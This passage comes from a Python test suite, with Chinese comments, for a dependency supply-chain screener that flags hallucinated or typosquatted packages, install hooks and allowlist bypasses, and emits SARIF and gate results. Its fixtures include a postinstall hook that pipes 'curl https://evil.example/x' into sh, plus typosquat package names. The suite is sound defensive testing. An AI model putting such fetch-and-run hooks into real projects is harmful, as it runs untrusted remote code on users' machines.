            self.assertEqual([f["policy_tier"] for f in fp], ["blocking"])
            fa = screen_pkg({"postinstall": "node build.js | sh"}, ["postinstall"], dec)
            self.assertEqual([f["policy_tier"] for f in fa], ["advisory"])
            fb = screen_pkg({"postinstall": "node build.js | sh"}, ["postinstall"], {"exec_only": "block"})
            self.assertEqual([f["policy_tier"] for f in fb], ["blocking"])
            self.assertEqual(screen_pkg({"prepare": "curl x | sh"}, ["preinstall", "install", "postinstall"], dec), ())

            pj = D / "package.json"
            pj.write_text(json.dumps({"scripts": {"postinstall": "curl https://evil.example/x | sh"}}), encoding="utf-8")
            self.assertIsNotNone(gs.self_install_hooks(self.env, pj))

    def test_lookup_and_allowlist_loading_version_matching_and_application(self):
        bl = {("pypi", "foo-bar"): {"reason": "t"}, (None, "baz_qux"): {"reason": "u"}}
        self.assertIsNotNone(gs.lookup(bl, "pypi", "Foo_Bar"))
        self.assertIsNotNone(gs.lookup(bl, "pypi", "baz.qux"))
        self.assertIsNone(gs.lookup(bl, "npm", "baz-qux"))

        with tempfile.TemporaryDirectory() as d:
            al = pathlib.Path(d) / "allowlist.yaml"
            base = {"approved_by": "a@x", "expires": "2026-12-31", "reason": "r"}
            entries = [
                dict(base, package="ok-range", ecosystem="npm", version=">=2.0.0 <3.0.0", bypass=["cooldown"]),
                dict(base, package="Typing_Ext", ecosystem="pypi", version="==1.0.0", bypass=["similarity", "low_download"]),
                dict(base, package="no-approver", bypass=["cooldown"], approved_by=None),
                dict(base, package="expired", bypass=["cooldown"], expires="2026-01-01"),
                dict(base, package="hooky", bypass=["install_hook"]),
                dict(base, package="caret", version="^1.2.0", bypass=["cooldown"]),
                dict(base, package="bad-date", bypass=["cooldown"], expires="next week"),
            ]
            al.write_text(yaml.safe_dump({"version": 1, "entries": entries}), encoding="utf-8")
            env_day = dataclasses.replace(self.env, today=date(2026, 10, 6))
            valid, ignored = gs.load_allowlist(env_day, al)
            self.assertEqual(sorted(e["package"] for e in valid), ["Typing_Ext", "ok-range"])
            self.assertEqual(len(ignored), 5)
            self.assertTrue(any("install_hook" in x for x in ignored))
            self.assertTrue(any("過期" in x for x in ignored))
            al.write_text(yaml.safe_dump({"packages": [entries[0]]}), encoding="utf-8")
            self.assertEqual([e["package"] for e in gs.load_allowlist(env_day, al)[0]], ["ok-range"])

        for sp, ver, want in [(None, None, True), ("2.32.5", "2.32.5", True), ("==2.32.5", "2.32.6", False),
                              (">=2.0.0 <3.0.0", "2.5.1", True), (">= 2.0, < 3", "3.0.0", False), (">=2.0.0", None, False),
                              (">=2.0.0 <3.0.0", "2.5.0-beta.1", False), ("1.2.3", "v1.2.3", True)]:
            self.assertEqual(gs.version_matches(gs.parse_version_spec(sp), ver), want, (sp, ver))

        ents = [
            {"package": "ok-range", "ecosystem": "npm", "spec": gs.parse_version_spec(">=2.0.0 <3.0.0"), "bypass": {"cooldown"},
             "approved_by": "a@x", "expires": "2026-12-31", "ticket": "SEC-1", "reason": "r"},
            {"package": "Typing_Ext", "ecosystem": "pypi", "spec": gs.parse_version_spec("1.0.0"), "bypass": {"similarity"},
             "approved_by": "a@x", "expires": "2026-12-31", "ticket": None, "reason": "r"},
        ]
        f_ok = gs.apply_allowlist(gs.fnd(self.env, "vibesec.g1.cooldown-violation", "ok-range", "npm", "2.1.0", "t", "blocking"), ents)
        self.assertEqual((f_ok["policy_tier"], f_ok["allowlist"]["ticket"]), ("advisory", "SEC-1"))
        for f_keep, why in [
            (gs.fnd(self.env, "vibesec.g1.cooldown-violation", "ok-range", "npm", "3.0.0", "t", "blocking"), "版本不在範圍"),
            (gs.fnd(self.env, "vibesec.g1.postinstall-egress", "ok-range", "npm", "2.1.0", "t", "blocking"), "安裝 hook 永不放行"),
            (gs.fnd(self.env, "vibesec.g1.hallucinated-package", "ok-range", "npm", "2.1.0", "t", "blocking", "registry_health"), "bypass 沒列"),
            (gs.fnd(self.env, "vibesec.g1.cooldown-violation", "ok-range", "pypi", "2.1.0", "t", "blocking"), "生態系不同"),
        ]:
            res = gs.apply_allowlist(f_keep, ents)
            self.assertEqual(res["policy_tier"], "blocking", why)
            self.assertNotIn("allowlist", res, why)
        res_hook_bypass = gs.apply_allowlist(
            gs.fnd(self.env, "vibesec.g1.postinstall-egress", "ok-range", "npm", "2.1.0", "t", "blocking"),
            [{"package": "ok-range", "ecosystem": "npm", "spec": None, "bypass": {"install_hook"},
              "approved_by": "a@x", "expires": "2026-12-31", "ticket": None, "reason": "r"}],
        )
        self.assertEqual(res_hook_bypass["policy_tier"], "blocking", "即使條目含 install_hook，apply_allowlist 仍依 BYPASSABLE 拒絕放行")
        self.assertNotIn("allowlist", res_hook_bypass)
        f_sim = gs.apply_allowlist(gs.fnd(self.env, "vibesec.g1.hallucinated-package", "typing-ext", "pypi", None, "t", "blocking", "similarity"), ents, "1.0.0")
        self.assertEqual(f_sim["policy_tier"], "advisory")

    def test_rule_file_globs_mentions_and_repo_docs_have_no_live_install_commands(self):
        for p, want in ((".cursor/rules/a.mdc", True), (".cursor/rules/x/y.mdc", True), ("CLAUDE.md", True),
                        ("sub/AGENTS.md", True), ("docs/x.md", True), ("notes.mdc", False), ("app/main.py", False)):
            self.assertEqual(gs.is_rule_file(self.env, ROOT, p), want, p)

        with tempfile.TemporaryDirectory() as d:
            D = pathlib.Path(d)
            rf = D / "AGENTS.md"
            rf.write_text("pip install -r requirements.lock.txt\n`pip install -e git+https://example.com/x.git`\n"
                          "uv pip install --index-url https://pypi.org/simple foo\npip install --requirement req.txt\n"
                          "npm install --registry https://r.example.com bar\npip install -U fastapi-auth-helperz\n"
                          "npm install -D left-pad\nRun `pip install requests`, then `pip install requests` again.\n",
                          encoding="utf-8")
            self.assertEqual(sorted(gs.rule_file_mentions(self.env, rf)),
                             [("npm", "left-pad", None), ("pypi", "fastapi-auth-helperz", None), ("pypi", "requests", None)])

            rf.write_text("先 pip install requests fastapi-auth-helperz --upgrade\n再 npm install express axois@1.2 && npm run x\n",
                          encoding="utf-8")
            self.assertEqual({(e, n) for e, n, _ in gs.rule_file_mentions(self.env, rf)},
                             {("pypi", "requests"), ("pypi", "fastapi-auth-helperz"), ("npm", "express"), ("npm", "axois")})

            rf.write_text("uv add --dev fastapi-auth-helperz\n`poetry add reqursts`\nbun add axois\npython -m pip install numpyy\n",
                          encoding="utf-8")
            self.assertEqual({(e, n) for e, n, _ in gs.rule_file_mentions(self.env, rf)},
                             {("pypi", "fastapi-auth-helperz"), ("pypi", "reqursts"), ("npm", "axois"), ("pypi", "numpyy")})

            env_rc = dataclasses.replace(self.env, rule_cfg=gs.RuleCfg(["*.rules"], re.compile(r"\bmytool\s+fetch\s+(?P<pypi>[^\n#]+)")))
            (D / "x.rules").write_text("mytool fetch --quiet evilpkg-x\n", encoding="utf-8")
            self.assertTrue(gs.is_rule_file(env_rc, D, "x.rules"))
            self.assertEqual(gs.rule_file_mentions(env_rc, D / "x.rules"), [("pypi", "evilpkg-x", None)])

        for doc in ("docs/02-g1-supply-chain.md", "docs/03-g2-secrets.md", "docs/adr/0003-g1-screen-seams-and-output-contract.md"):
            self.assertEqual(gs.rule_file_mentions(self.env, ROOT / doc), [], doc)

    def test_cfg_similarity_keys_and_gate_status_wiring(self):
        cy = gs.load_yaml(self.env.config_dir / "cooldown.yaml") or {}
        c = gs.cfg(self.env)
        self.assertEqual((c["similarity"], c["levenshtein_max"], c["min_name_length"]),
                         tuple((cy.get("similarity") or {}).get(k) for k in ("difflib_ratio_min", "levenshtein_max", "min_name_length")))
        blk = [{"rule_id": "vibesec.g1.cooldown-violation", "policy_tier": "blocking"}]
        st, why = gs.gate_status(blk, ["registry 逾時"], gs.gate_coverage(blk, ["registry 逾時"], 1), ("註記",))
        self.assertEqual(st, "fail")
        self.assertTrue(all(x in (why or "") for x in ("registry 逾時", "註記")))
        st2, why2 = gs.gate_status([], [], gs.gate_coverage([], [], 2), ())
        self.assertEqual(st2, "incomplete")
        self.assertIn("VS-G1-INSTALL-HOOK", why2 or "")


class OutputViewsContract(_ScreenCase):
    """鎖住標準輸出兩種形狀、標準錯誤結果行全部字串、SARIF 與閘門結果契約（ADR 0003）。"""

    def test_all_result_lines_and_both_stdout_shapes_are_exact(self):
        # 1) 略過（空範圍、無問題）＋標準輸出形狀 1
        skip = gs.screen(gs.Request(target=self.D, staged=True), self.env(git=FakeGit(staged=[]), this_repo=True))
        self.assertEqual(skip.to_stdout(), {"gate": "G1", "findings": []})
        self.assertEqual(skip.result_line(), "G1 slopcheck：無相依清單或規則檔變更，略過。")

        # 2) 空範圍但有未完成原因（指定的檔案不存在）＋標準輸出形狀 1（帶 status／status_reason）＋--changed-files 無 --base 亦記 scope diff
        miss = gs.screen(gs.Request(target=self.D, manifests=("ghost.txt",)), self.env())
        self.assertEqual((miss.status, miss.exit_code), ("incomplete", 2))
        self.assertEqual(miss.to_stdout(), {
            "gate": "G1", "findings": [], "target": str(self.D),
            "status": "incomplete", "status_reason": "指定的檔案不存在，未檢查：ghost.txt",
        })
        self.assertEqual(miss.result_line(), "⚠️ G1 無法完成檢查：指定的檔案不存在，未檢查：ghost.txt → incomplete。")
        self.assertIn("ghost.txt", miss.to_gate_run("2026-11-19T00:00:00+00:00", "deadbeef").get("status_reason") or "")
        lst = self.write("changed.txt", "\n")
        diff_no_base = gs.screen(gs.Request(target=self.D, changed_lists=(str(lst),)), self.env())
        self.assertEqual(diff_no_base.to_gate_run("2026-11-19T00:00:00+00:00", "deadbeef")["scope"], "diff")

        # 3) 範圍失敗（無 stdout、無 SARIF）
        sf = gs.screen(gs.Request(target=self.D, staged=True),
                       self.env(git=FakeGit(staged=gg.GitFailure("git 失敗"))))
        self.assertIsNone(sf.to_stdout())
        self.assertIsNone(sf.to_sarif())
        self.assertEqual(sf.result_line(), "⚠️ G1 無法完成檢查：--staged 取不到暫存區變更（git 失敗）→ incomplete。")

        # 4) 有掃描：通過（帶前導換行）＋標準輸出形狀 2（另驗過期 allowlist 出現在 ignored_allowlist）
        self.write("package.json", '{"dependencies": {"express": "4.21.2"}}\n')
        ok_out = gs.screen(gs.Request(target=self.D, manifests=("package.json",)),
                           self.env(registry=gr.FakeRegistry({("npm", "express", "4.21.2"): npm_clean()})))
        self.assertEqual(ok_out.result_line(), "\n✅ G1 快篩通過。")
        self.assertEqual(list(ok_out.to_stdout().keys()), ["gate", "findings", "target", "notes"])
        exp_out = gs.screen(gs.Request(target=self.D, manifests=("package.json",)),
                            self.env(registry=gr.FakeRegistry({("npm", "express", "4.21.2"): npm_clean()}), today=date(2099, 1, 1)))
        self.assertIn("ignored_allowlist", exp_out.to_stdout())

        # 5) 有掃描：blocking 阻擋
        blk_out = gs.screen(gs.Request(target=self.D, manifests=("package.json",)),
                            self.env(registry=gr.FakeRegistry({("npm", "express", "4.21.2"): gr.NotFound()})))
        self.assertEqual(blk_out.result_line(), "\n⛔ G1 阻擋：1 筆 blocking 供應鏈發現。")
        self.assertEqual(blk_out.to_stdout().get("status"), "fail")

        # 6) 有掃描：檢查未完成（registry 失敗）
        inc_out = gs.screen(gs.Request(target=self.D, manifests=("package.json",)),
                            self.env(registry=gr.FakeRegistry({("npm", "express", "4.21.2"): gr.Unavailable("HTTP 503")})))
        self.assertEqual(inc_out.result_line(),
                         "\n⚠️ G1 無法完成檢查（網路/registry 失敗或鎖定檔未解析）→ incomplete，絕不視為通過。")
        self.assertIn("incomplete_checks", inc_out.to_stdout())
        self.assertIn("untested_controls", inc_out.to_stdout())

        # 7) 有掃描：無檢查失敗但有控制未實測（PyPI 安裝腳本未檢查）
        self.write("requirements.txt", "requests==2.32.0\n")
        py_out = gs.screen(gs.Request(target=self.D, manifests=("requirements.txt",)),
                           self.env(registry=gr.FakeRegistry({("pypi", "requests", "2.32.0"): pypi_clean()})))
        self.assertEqual(
            py_out.result_line(),
            "\n⚠️ G1 有控制未實測 → incomplete，絕不視為通過：VS-G1-INSTALL-HOOK 未實測（1 個 PyPI 套件的安裝腳本尚無檢查（只檢查 npm scripts））",
        )

    def test_sarif_and_gate_result_views_including_unreadable_policy_validate_against_schema(self):
        # 1) 政策讀不到：to_gate_run 直接回傳完整的未完成閘門結果 dict（不拋例外）
        unr = gs.Outcome.unreadable(f"{POLICY_UNREADABLE}（測試）", gs.Request(staged=True, base="abc123"), config_root=ROOT)
        self.assertEqual((unr.exit_code, unr.status, unr.scope, unr.to_stdout(), unr.to_sarif()), (2, "incomplete", "diff", None, None))
        self.assertEqual(unr.result_line(), f"⚠️ G1 無法完成檢查：{POLICY_UNREADABLE}（測試） → incomplete。")
        g_unr = unr.to_gate_run("2026-11-19T00:00:00+00:00", "deadbeef", sarif_ref="reports/g1.sarif")
        self.assertEqual(list(GATE_SCHEMA.iter_errors(g_unr)), [])
        self.assertEqual(g_unr["mode"], "enforce")
        self.assertEqual(g_unr["tools"], [gate_result.tool("vibesec-slopcheck", "error", version="2.0.0")])
        self.assertEqual([c["control_id"] for c in g_unr["coverage"] if c["state"] == "pending"], ["VS-G1-SBOM", "ASVS5-V15.2"])

        # 2) 範圍失敗：無 SARIF 檢視，因此 to_gate_run 的 tool.output_ref 必須為 None（不指向不存在／已刪的檔案）
        sf = gs.screen(gs.Request(target=self.D, staged=True),
                       self.env(git=FakeGit(staged=gg.GitFailure("git 失敗"))))
        g_sf = sf.to_gate_run("2026-11-19T00:00:00+00:00", "deadbeef", sarif_ref="reports/g1.sarif")
        self.assertEqual(list(GATE_SCHEMA.iter_errors(g_sf)), [])
        self.assertIsNone(g_sf["tools"][0]["output_ref"])

        # 3) 完整 SARIF 與完整閘門結果逐欄對照（鎖住與重構前逐字相同）
        self.write("sub/package.json", '{"dependencies": {"evil-pkg": "1.0.0", "lowdl-pkg": "2.0.0"}}\n')
        out_full = gs.screen(
            gs.Request(target=self.D, manifests=("sub/package.json",), base="cafebabe"),
            self.env(
                registry=gr.FakeRegistry({
                    ("npm", "evil-pkg", "1.0.0"): gr.NotFound(),
                    ("npm", "lowdl-pkg", "2.0.0"): npm_clean("lowdl-pkg", "2.0.0", downloads=5),
                }),
                git=FakeGit(files={("cafebabe", "sub/package.json"): '{"dependencies": {}}\n'}),
                this_repo=True,
            ),
        )
        want_sarif = gate_result.sarif(
            {"name": "vibesec-slopcheck", "version": "2.0.0"},
            [
                {"id": "vibesec.g1.hallucinated-package", "name": "vibesec.g1.hallucinated-package",
                 "shortDescription": {"text": "vibesec.g1.hallucinated-package"}, "properties": {"policy_tier": "blocking"}},
                {"id": "vibesec.g1.low-download-package", "name": "vibesec.g1.low-download-package",
                 "shortDescription": {"text": "vibesec.g1.low-download-package"}, "properties": {"policy_tier": "advisory"}},
            ],
            [
                {
                    "ruleId": "vibesec.g1.hallucinated-package",
                    "level": "error",
                    "message": {"text": "[npm] evil-pkg@1.0.0 — npm registry 查無此套件（疑似幻覺/搶註）"},
                    "locations": [{"physicalLocation": {"artifactLocation": {"uri": "sub/package.json"}}}],
                    "partialFingerprints": {"vibesecPackage": "vibesec.g1.hallucinated-package|npm|evil-pkg|sub/package.json"},
                    "properties": {"package": "evil-pkg", "ecosystem": "npm", "version": "1.0.0",
                                   "policy_tier": "blocking", "manifest": "sub/package.json"},
                },
                {
                    "ruleId": "vibesec.g1.low-download-package",
                    "level": "warning",
                    "message": {"text": "[npm] lowdl-pkg@2.0.0 — 週下載量 5 < 1000，信譽不足，需人工判斷"},
                    "locations": [{"physicalLocation": {"artifactLocation": {"uri": "sub/package.json"}}}],
                    "partialFingerprints": {"vibesecPackage": "vibesec.g1.low-download-package|npm|lowdl-pkg|sub/package.json"},
                    "properties": {"package": "lowdl-pkg", "ecosystem": "npm", "version": "2.0.0",
                                   "policy_tier": "advisory", "manifest": "sub/package.json"},
                },
            ],
        )
        self.assertEqual(out_full.to_sarif(), want_sarif)

        g_full = out_full.to_gate_run("2026-11-19T00:00:00+00:00", "deadbeef", sarif_ref="reports/g1.sarif")
        self.assertEqual(list(GATE_SCHEMA.iter_errors(g_full)), [])
        g_norm = dict(g_full, finished_at="2026-11-19T00:00:01+00:00")
        pol = Policy(ROOT, project_root=self.D)
        vb = gs.mapping(gs.load_yaml(ROOT / "vibesec.yaml"))
        self.assertEqual(g_norm, {
            "gate": "G1",
            "status": "fail",
            "status_reason": None,
            "mode": pol.mode,
            "scope": "diff",
            "commit": "deadbeef",
            "diff_base": "cafebabe",
            "risk_tier": vb.get("risk_tier", "L2"),
            "started_at": "2026-11-19T00:00:00+00:00",
            "finished_at": "2026-11-19T00:00:01+00:00",
            "tools": [gate_result.tool("vibesec-slopcheck", "ran", version="2.0.0", output_ref="reports/g1.sarif")],
            "findings_count": {"blocking": 1, "advisory": 1},
            "coverage": [
                {"control_id": "VS-G1-SLOPSQUAT", "state": "fail", "reason": None},
                {"control_id": "VS-G1-COOLDOWN", "state": "pass", "reason": None},
                {"control_id": "VS-G1-INSTALL-HOOK", "state": "pass", "reason": None},
                {"control_id": "VS-G1-SBOM", "state": "pending", "reason": None},
                {"control_id": "ASVS5-V15.2", "state": "pending", "reason": None},
            ],
        })

        # 4) 非 UTF-8 路徑在 SARIF URI 百分比編碼
        non_utf8 = os.fsdecode(b"\xff-dir")
        p = self.D / non_utf8
        try:
            p.mkdir()
            (p / "package.json").write_text('{"dependencies": {"evil-pkg": "1.0.0"}}\n', encoding="utf-8")
        except OSError:
            self.skipTest("檔案系統不接受非 UTF-8 檔名")
        out_raw = gs.screen(gs.Request(target=self.D, manifests=(f"{non_utf8}/package.json",)),
                            self.env(registry=gr.FakeRegistry({("npm", "evil-pkg", "1.0.0"): gr.NotFound()})))
        self.assertEqual(out_raw.to_sarif()["runs"][0]["results"][0]["locations"][0]["physicalLocation"]["artifactLocation"]["uri"],
                         "%FF-dir/package.json")


if __name__ == "__main__":
    unittest.main()
